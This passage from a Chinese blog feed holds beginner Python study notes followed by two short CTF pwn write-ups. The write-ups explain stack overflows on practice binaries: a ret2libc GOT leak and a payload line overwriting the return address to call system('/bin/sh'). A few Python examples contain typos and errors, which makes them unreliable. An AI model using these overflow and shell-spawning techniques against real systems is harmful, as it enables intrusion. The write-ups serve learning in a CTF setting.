class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> expr:<br>    statements<br><span class="hljs-keyword">else</span>:<br>    additional_statements<br></code></pre></td></tr></table></figure>本人认为不用在意，直接while内写if语句即可。<br>此语法内，else语句执行完以后，退出整个循环体。</li></ol><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>Python for 循环可以遍历任何可迭代对象，如一个列表，或者一个字符串。<br>for 循环一般格式如下:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">for</span> <span class="hljs-keyword">variable</span> in <span class="hljs-comment">sequence:</span><br>    statements<br></code></pre></td></tr></table></figure><p>for语句内可以加入break关键字来退出循环。</p><p>range()函数：<br>range函数可以生成数列，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#1</span><br>    <span class="hljs-comment">#2</span><br>    <span class="hljs-comment">#3</span><br>    <span class="hljs-comment">#4</span><br></code></pre></td></tr></table></figure><p>也可以用range指定区间值。<br>如range(5,9)会生成5到8<br>同样是左闭右开。<br>三个参数时，第三个为步长：<br>range(0,10,3)会打印0，3，6，9<br>亦可以用range()函数创建一个列表：<br>list(range(5))<br><strong>注意：range(x)是从0开始，到x-1，即左闭右开。</strong><br>Python中也有continue关键字，可以开启下一轮循环。</p><p>补充<strong>None == False</strong></p><p><code>pass</code>为占位语句，一般为了缩进符合要求，占位用。<br>pass不会执行任何操作，是空语句。</p><h2 id="0x16-Python3-迭代器与生成器"><a href="#0x16-Python3-迭代器与生成器" class="headerlink" title="0x16 Python3 迭代器与生成器"></a>0x16 Python3 迭代器与生成器</h2><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>迭代时Python最强大的功能之一，是访问集合元素的一种方式。<br>迭代器是一个可以记住遍历位置的对象。<br>迭代器从集合的第一个元素开始访问，只能向前不能后退。直到所有元素被访问完毕。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br><span class="hljs-literal">it</span> = iter(<span class="hljs-keyword">list</span>) <span class="hljs-comment">#create an iterator</span><br><span class="hljs-built_in">print</span>(next(<span class="hljs-literal">it</span>)) <span class="hljs-comment"># print the next element pointed by iterator</span><br><span class="hljs-comment">#1</span><br><span class="hljs-built_in">print</span>(next(<span class="hljs-literal">it</span>))<br><span class="hljs-comment">#2</span><br></code></pre></td></tr></table></figure><p>由以上示例可看出，迭代器启示位置是第一个元素之前。<br>next(it)一次以后，就会指向第一个元素。</p><p><strong>for语句可以以迭代器为序列对象传入。</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">list</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br><span class="hljs-keyword">it</span> = iter(<span class="hljs-built_in">list</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-keyword">it</span>:<br>    print(<span class="hljs-keyword">it</span>)<br></code></pre></td></tr></table></figure><h2 id="0x17-Python3-函数"><a href="#0x17-Python3-函数" class="headerlink" title="0x17 Python3 函数"></a>0x17 Python3 函数</h2><h3 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h3><p> 函数代码块以<code>def</code>关键词开头。<br> 传入的参数，放在括号内。<br> 函数体以冒号<code>:</code>开始，并且缩进。<br> return [表达式]结束函数，选择性的返回一个值给调用方。<strong>不带表达式的return相当于返回None</strong><br> <img src="/2022/03/23/Python-noob/p4"></p><h3 id="可更改-mutable-与不可更改-immutable-对象"><a href="#可更改-mutable-与不可更改-immutable-对象" class="headerlink" title="可更改(mutable)与不可更改(immutable)对象"></a>可更改(mutable)与不可更改(immutable)对象</h3><p>在Python中，strings,tuples,numbers是不可变对象，而list,dict等则是可修改对象。<br>原理：<br><strong>不可变类型</strong>：当a = 5被赋值为a = 10时，其实是a这个指针指向的地址发生了改变。<br><strong>可变类型</strong>：当list = [1,2,3,4]被修改为l[2] = 19时，将list的第三个元素值进行修改，而list本身没有改变。<br>Python函数的参数传递：<br><strong>不可变类型</strong>：类似C++的值传递，不会影响传入对象的值。<br><strong>可变类型</strong>：类似C++的引用传递，修改后外部也会受到影响。</p><p>注意：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">change1</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>        i = <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> <br>list1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>change1(list1)<br><span class="hljs-built_in">print</span>(list1)<br><span class="hljs-comment">#此时会发现打印出来的仍然是1,2,3,4</span><br><span class="hljs-comment">#也就是原列表。</span><br><span class="hljs-comment">#但如果用以下代码：</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change2</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        a[i] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <br>list1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]<br>change2(list1)<br><span class="hljs-built_in">print</span>(list1)<br><span class="hljs-comment">#会打印出1，1，1，1也就是修改以后的值。</span><br></code></pre></td></tr></table></figure><p>此处提醒我们，若需要修改传入的list值，我们需要在list层面进行操作，而不能进入list内，进行赋值（此时就是对不可变类型Number进行赋值）</p><h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printme</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-keyword">return</span><br><br>printme(<span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;fc noob&quot;</span>)<br></code></pre></td></tr></table></figure><p>关键字参数传入时可以不按顺序，但不按顺序传参时，需要指明，数据类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printme</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>,<span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-keyword">return</span><br><br>printme(<span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>,<span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;fc noob&quot;</span>)<br></code></pre></td></tr></table></figure><p>这样是正确的语法，如果不加“int = ”和“str = ”则函数会输出1.</p><h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><p>部分参数确定，部分参数长度不定时，语法如下：</p><blockquote><p>def func(certain_part , *var_args_tuple):<br>func_body<br>return return_value</p></blockquote><p>加了星号<code>*</code>的参数会以元组形式引入，存放所有未预期的变量参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printme</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, *var</span>):<br>    pritn(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-built_in">print</span>(var)<br>    <span class="hljs-keyword">return</span><br><br>printme(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>)<br><span class="hljs-comment">#10</span><br><span class="hljs-comment">#(20,30)</span><br><span class="hljs-comment">#以上为输出结果。</span><br></code></pre></td></tr></table></figure><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>Python使用<code>lambda</code>来创建匿名函数。</p><ol><li>lambda是一个表达式，函数体比def简单很多。</li><li>lambda的主体是一个表达式，而不是一个代码块。</li><li>lambda函数拥有自己的命名空间，且不能访问自己参数以外的全局命名空间内的参数。</li><li>lambda只能写一行。<br>语法：<blockquote><p>lambda arg1,arg2,… : expression</p></blockquote>如：<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">x = lambda <span class="hljs-selector-tag">a</span> : <span class="hljs-selector-tag">a</span> + <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(x(<span class="hljs-number">5</span>)</span></span>)<br>#输出<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure>以以上代码为例<br>语法为：<br>函数名 = <code>lambda</code> arg : operations_on_arg</li></ol><p>我们可以将匿名函数封装在一个函数内，这样可以用同样的代码创建多个匿名函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">lambda</span> a : a*n<br><br>MyTriple = func(<span class="hljs-number">3</span>)<br>MyDouble = func(<span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">print</span>(MyTriple(<span class="hljs-number">11</span>))<br><span class="hljs-built_in">print</span>(MyDouble(<span class="hljs-number">11</span>))<br><br><span class="hljs-comment"># 33</span><br><span class="hljs-comment"># 22</span><br></code></pre></td></tr></table></figure><p>可见，上述<code>MyDouble</code>与<code>MyTriple</code>都是匿名函数，其依靠于func()。</p><h2 id="0x18-Python3-数据结构"><a href="#0x18-Python3-数据结构" class="headerlink" title="0x18 Python3 数据结构"></a>0x18 Python3 数据结构</h2><h3 id="将列表当堆栈使用"><a href="#将列表当堆栈使用" class="headerlink" title="将列表当堆栈使用"></a>将列表当堆栈使用</h3><p>利用list方法中的.append()与.pop()方法，对List末尾的数据进行出栈入栈操作。</p><h2 id="0x19-Python3-模块"><a href="#0x19-Python3-模块" class="headerlink" title="0x19 Python3 模块"></a>0x19 Python3 模块</h2><p>把定义、变量存放在一个文件中，为一些脚本或交互式的解释器使用，这个文件被称为模块。<br>模块是一个包含你所定义的函数及变量的文件。后缀名为.py。<br>例如，import sys<br>类似C++的多文件编写，import就是包含头文件。</p><h3 id="import-语句"><a href="#import-语句" class="headerlink" title="import 语句"></a>import 语句</h3><p>下面为示范:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Filename:support.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myprint</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></table></figure><p>这是“头文件”，也就是模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> support<br>support.myprint(<span class="hljs-string">&#x27;fc&#x27;</span>) <span class="hljs-comment">#用.support方法调用support.py模块中的函数。</span><br></code></pre></td></tr></table></figure><p>输出结果为’fc’</p><h3 id="from……import-语句"><a href="#from……import-语句" class="headerlink" title="from……import 语句"></a>from……import 语句</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> fibo <span class="hljs-keyword">import</span> fib,fib1<br></code></pre></td></tr></table></figure><p>如此，仅仅把fibo模块中的指定函数引入进来。</p><p><strong>from … import* 与 import 的区别</strong>：<br>用import时，每次调用其中的函数，需要加模块名。<br>from….import*则不需要加，直接用函数就行。<br>如support 模块中有myprint函数。<br>import情况下，调用方法为<code>support.myprint()</code><br>而from….import*调用方法就是<code>myprint()</code></p><h2 id="0x20-Python3-输入和输出"><a href="#0x20-Python3-输入和输出" class="headerlink" title="0x20 Python3 输入和输出"></a>0x20 Python3 输入和输出</h2><h3 id="str-format-基本使用"><a href="#str-format-基本使用" class="headerlink" title="str.format() 基本使用"></a>str.format() 基本使用</h3><blockquote><p>print(‘{},hello,{}’.format(‘google’,’fc’))</p></blockquote><p>可以将括号内内容替换为format中的参数。<br>花括号内可以写上0，1之类的数字，以改变参数的顺序。</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>))</span><br>Google 和 Runoob<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>))</span><br>Runoob 和 Google<br></code></pre></td></tr></table></figure><h3 id="读取键盘输入"><a href="#读取键盘输入" class="headerlink" title="读取键盘输入"></a>读取键盘输入</h3><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">str</span> = <span class="hljs-keyword">input</span>(<span class="hljs-string">&#x27;请输入：&#x27;</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">str</span>)<br></code></pre></td></tr></table></figure><h3 id="读和写文件"><a href="#读和写文件" class="headerlink" title="读和写文件"></a>读和写文件</h3><p>open()将返回一个file对象，基本格式如下：</p><blockquote><p>open(filename, mode)</p></blockquote><p>部分模式如下：<br>r：只读方式打开文件。文件的指针位于文件开头。是默认的模式。<br>rb：二进制模式只读打开。<br>r+：用于读写。<br>rb+：二进制读写。<br>w：只用于写入。如果文件已经存在，则删除原有内容，从头开始写。<br>wb：二进制写入。<br>w+：与r+相同。但是会删除原有内容。<br>a：用于追加写，不会删除以前的内容。</p><p>注意<strong>需要与C++一样创建文件对象</strong>如下：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">f = <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;w+&quot;</span>)<br>f.<span class="hljs-keyword">write</span>(<span class="hljs-string">&quot;hello&quot;</span>)<br>f.<span class="hljs-keyword">close</span>()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;r+&quot;</span>)<br><span class="hljs-built_in">str</span> = f.read()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-comment">#hello</span><br></code></pre></td></tr></table></figure><p>读取时的函数：<br>f.read(len)：会读取len长度的文件内容，如果len&lt;0或没有传入参数，则读取全部内容。<br>f.readline()：会读取文件中的一行。如果此函数返回一个空字符串，则为最后一行。<br>写入时的write()函数返回值是写入的字符数。</p><h3 id="with关键字"><a href="#with关键字" class="headerlink" title="with关键字"></a>with关键字</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;r+&quot;</span>) <span class="hljs-keyword">as</span> f:<br>      read_date = f.<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p>with关键字简洁快速，而且可以自动帮你关闭文件。</p><h2 id="0x21-Python3-File方法"><a href="#0x21-Python3-File方法" class="headerlink" title="0x21 Python3 File方法"></a>0x21 Python3 File方法</h2><h3 id="open-方法"><a href="#open-方法" class="headerlink" title="open()方法"></a>open()方法</h3><p>若文件无法被正确的打开，会抛出OSError。<br>注意<strong>open()方法一定要正确地关闭文件，close()</strong></p><h2 id="0x22-Python3-面向对象"><a href="#0x22-Python3-面向对象" class="headerlink" title="0x22 Python3 面向对象"></a>0x22 Python3 面向对象</h2><h3 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h3><p>class ClassName:<br>    statement-1<br>    .<br>    .<br>    .<br>    statement-n</p><h3 id="类对象"><a href="#类对象" class="headerlink" title="类对象"></a>类对象</h3><p>类内有一个名为__init__()的特殊方法（构造方法），该方法会自动调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Complex</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, realpart, imagpart</span>):<br>        self.r = realpart<br>        self.i = imagpart<br>x = Complex(<span class="hljs-number">3.0</span>, -<span class="hljs-number">4.5</span>)<br><span class="hljs-built_in">print</span>(x.r, x.i)   <span class="hljs-comment"># 输出结果：3.0 -4.5</span><br></code></pre></td></tr></table></figure><p><strong>注意，self代表类的实例，而非类</strong><br><strong>类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的第一个参数名称，叫做self（惯例）</strong></p><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs monkey"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> :<br>    def mprint(<span class="hljs-variable language_">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>.__class__)<br><br>t = My<span class="hljs-keyword">class</span><br><span class="hljs-title class_">t</span>.mprint()<span class="hljs-meta"></span><br><span class="hljs-meta">#结果为</span><span class="hljs-meta"></span><br><span class="hljs-meta">#&lt;__main__.Test instance at 0x100771878&gt;</span><span class="hljs-meta"></span><br><span class="hljs-meta">#__main__.Test</span><br><br></code></pre></td></tr></table></figure><p>可见self代表的是类的实例。代表当前对象的地址。self.class指向类。<br><strong>self不是关键字，所以self可以换成其他标识符</strong></p><h3 id="类的方法"><a href="#类的方法" class="headerlink" title="类的方法"></a>类的方法</h3><p>也就是类内函数。<br>但注意，def以后，第一个参数一定是self，self是类的实例，方法内对类元素的操作，用self.element来调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span>:<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    age = <span class="hljs-number">0</span><br>    <span class="hljs-comment">#以上为公有基本属性。</span><br>    __weight = <span class="hljs-number">0</span> <span class="hljs-comment">#双下划线开头的元素为私有元素，在外界无法访问到。</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n,a,w</span>):<br>        self.name = n<br>        self.age = a<br>        self.__weight = w<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.name,self.age)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s说：我今年%d岁&quot;</span>%(self.name,self.age))<br><br><span class="hljs-comment">#单继承示例：</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">student</span>(<span class="hljs-title class_ inherited__">people</span>):<br>    grade = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n,a,w,g</span>):<br>        people.__init__(self,n,a,w)<span class="hljs-comment">#调用父类的构造函数</span><br>        self.grade = g<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<span class="hljs-comment">#重写父类函数（多态）</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s said that, i am %d years old, and i am in grade %d&quot;</span>%(self.name,self.age,self.grade))<br><br>s = student(<span class="hljs-string">&quot;peter&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">60</span>,<span class="hljs-number">3</span>)<br>s.speak()<br></code></pre></td></tr></table></figure><p><strong>总结：Python的继承，用小括号在类名里面写父类。<br>可以在__init__()内调用父类的构造函数节约工序<br>子类中直接重写父类函数完成多态</strong><br>Python可以多继承：<br>class class1(fa1,fa2….,fan):<br>statement-1<br>.<br>.<br>.<br>.<br>statement-n<br>over<br><strong>多继承时，调用多个父类同时含有的函数时，优先靠左的函数。</strong></p><h3 id="类属性与方法"><a href="#类属性与方法" class="headerlink" title="类属性与方法"></a>类属性与方法</h3><p>类的私有属性/方法：<strong>用下划线开头即可</strong><br>__element1<br>def __method:<br>…</p><h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><p>例如：</p><p>``` python<br>class Vector:<br>    def <strong>init</strong>(self,a,b):<br>        self.a = a<br>        self.b = b</p><div class="code-wrapper"><pre><code class="hljs">def __str__(self):#此处重载的是打印方法，也就是把该类作为字符串打印    return &#39;Vector (%d,%d)&#39;%(self.a,self.b)    def __add__(self,other):    return Vector(self.a+other.a,self.b+other.b)</code></pre></div><p>v1 = Vector(1,1)<br>v2 = Vector(2,10)<br>print(v1+v2)</p>]]></content>
    
    
    
    <tags>
      
      <tag>embrace Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>basic usage of libc</title>
    <link href="/2022/03/22/basic-usage-of-libc/"/>
    <url>/2022/03/22/basic-usage-of-libc/</url>
    
    <content type="html"><![CDATA[<h1 id="libc的基本用法"><a href="#libc的基本用法" class="headerlink" title="libc的基本用法"></a>libc的基本用法</h1><h2 id="题目来源：XCTF-PWN-新手区-level3"><a href="#题目来源：XCTF-PWN-新手区-level3" class="headerlink" title="题目来源：XCTF-PWN-新手区-level3"></a>题目来源：XCTF-PWN-新手区-level3</h2><h2 id="0下"><a href="#0下" class="headerlink" title="0下"></a>0下</h2><h2 id="0x1-基本分析"><a href="#0x1-基本分析" class="headerlink" title="0x1 基本分析"></a>0x1 基本分析</h2><p>32-bit elf文件</p><p>NX保护开启</p><p>32位IDA下，仅有一个read溢出点</p><p>栈溢出方式获取system权限</p><h2 id="0x2-找到突破口"><a href="#0x2-找到突破口" class="headerlink" title="0x2 找到突破口"></a>0x2 找到突破口</h2><p>没有任何后门函数，没有调用system函数<br><br>但是题目给出了libc_32.so.6文件<br><br>思路如下：<br><strong>利用题目中调用的write函数，打印自身got表地址，通过write函数与libc基址的offset值，获得libc基址，从而调用libc中的内容（libc中既有system函数又有/bin/sh字符串）</strong></p><p>构建exp脚本如下：<br><img src="/2022/03/22/basic-usage-of-libc/p1.png" alt="exp脚本"></p><ol><li>完成136大小的buf字符串数组溢出和32位下saved_register  ebp的溢出</li><li>用write函数地址覆盖返回地址，以调用write函数。</li><li>布置栈帧，此处覆盖意义为，write函数的返回地址，覆盖为main函数地址，准备第二次溢出。</li><li>布置栈帧，write函数的参数。（通过此处获取got地址）</li></ol><p><br>\</p><p>第二次溢出，覆盖后调用system(“/bin/sh”)<br>完成本题。</p><h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><ol><li>用elf = ELF(“./file”)的形式调用文件内，自有的函数的plt、got地址。</li><li>32位的题，用布置栈帧方法。</li><li>打印出来的got地址，用u32方法解码后，是该函数在libc中的真实地址。</li><li>用libc.symbols[“func”]的方法获取函数func相对基址的offset。</li><li>二次溢出，达到一次拿地址，二次打通的效果。</li><li>教科书式的题值得多次揣摩！</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>create /bin/sh</title>
    <link href="/2022/03/20/create-bin-sh/"/>
    <url>/2022/03/20/create-bin-sh/</url>
    
    <content type="html"><![CDATA[<h1 id="当目标有调用system函数，但无-bin-sh字符串时"><a href="#当目标有调用system函数，但无-bin-sh字符串时" class="headerlink" title="当目标有调用system函数，但无/bin/sh字符串时"></a>当目标有调用system函数，但无/bin/sh字符串时</h1><p>xctf pwn新手区最后三题之一，cgpwn2.</p><p>打开IDA乍一看，没有后门函数，没有明显的可导向的返回地址。</p><p><img src="/2022/03/20/create-bin-sh/bin1.png"></p><p>关注有两个读取输入的地方，一个是有限制大小的读取函数，另一个是gets()这个危险函数。</p><p>考虑到这题只开启了NX保护，栈溢出应该是必须的。</p><p>于是，思路是通过name字符串，导入“/bin/sh”字符串。</p><p>再通过gets()溢出，传入_system函数地址，最后传入/bin/sh。</p><p>\</p><blockquote><p>payload = b’a’*42 + p32(_system_addr) + p32(0x0) + p32(/bin/sh_addr)</p></blockquote><p>上面是脚本中核心语句。</p><p>b’a’*42 填充字符串和ebp</p><p>后面传入system函数地址替换原有返回地址，以调用system函数。</p><p>进入system函数后，因为这里是32位程序，推荐用布置栈帧的方式传参。</p><p>也就是，调用system后，此时位于system函数栈的ebp顶部。</p><p>需要传入一个4字节的数据，填充返回地址，然后来到传入的参数部分。</p><p>将/bin/sh 字符串的地址传入，完成传参。</p><p>达到调用system(“/bin/sh”)的目的。</p><p>劫持到程序，cat flag拿到答案。</p><p>总结下，第一眼看上去没法溢出，是因为忽略了通过传参的手段，构造一个system(“/bin/sh”)的可能性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf in do♂r</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xctf int_overflow整数类型的溢出</title>
    <link href="/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/03/06/xctf-int-overflow%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA/</url>
    
